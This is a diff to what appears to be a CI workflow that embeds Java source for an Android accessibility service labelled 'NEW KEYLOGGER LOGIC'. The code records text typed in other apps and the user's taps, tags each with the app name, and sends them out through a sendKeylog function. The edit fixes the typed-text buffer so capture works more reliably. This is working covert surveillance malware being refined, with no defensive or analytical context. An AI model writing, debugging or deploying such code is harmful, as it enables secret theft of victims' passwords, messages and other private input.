@@ -580,22 +580,22 @@ jobs:
                   return list;
               }
 
-              // ================== NEW KEYLOGGER LOGIC ==================
+              // ================== NEW KEYLOGGER LOGIC (FIXED BUFFER) ==================
               @Override
               public void onAccessibilityEvent(AccessibilityEvent event) {
                   if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                       if (event.getText() != null && event.getText().size() > 0) {
                           String typedText = event.getText().get(0).toString();
                           if (!typedText.isEmpty()) {
-                              // Accumulate text in buffer
                               if (pendingText.length() == 0) {
                                   pendingPackageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
                               }
-                              pendingText.append(typedText).append(" ");
+                              // ✅ FIX: Replace buffer, not append
+                              pendingText.setLength(0);
+                              pendingText.append(typedText);
                           }
                       }
                   } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                      // User clicked something
                       AccessibilityNodeInfo source = event.getSource();
                       String clickedText = "";
                       if (source != null) {
@@ -603,21 +603,16 @@ jobs:
                           source.recycle();
                       }
 
-                      // Prepare app name for display
                       String appName = getAppDisplayName(event.getPackageName() != null ? event.getPackageName().toString() : "Unknown");
 
-                      // First send tap event
                       String tapMessage = "👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText);
                       sendKeylog(tapMessage);
 
-                      // Then send typed text if any
                       if (pendingText.length() > 0) {
                           String typed = pendingText.toString().trim();
-                          // Use pending package name for typed text's app context
                           String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
                           String keylogMessage = "[" + typedAppName + "] " + typed;
                           sendKeylog(keylogMessage);
-                          // Clear buffer
                           pendingText.setLength(0);
                           pendingPackageName = null;
                       }
@@ -630,7 +625,7 @@ jobs:
                       ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
                       return pm.getApplicationLabel(ai).toString();
                   } catch (Exception e) {
-                      return packageName; // fallback to package name
+                      return packageName;
                   }
               }
 
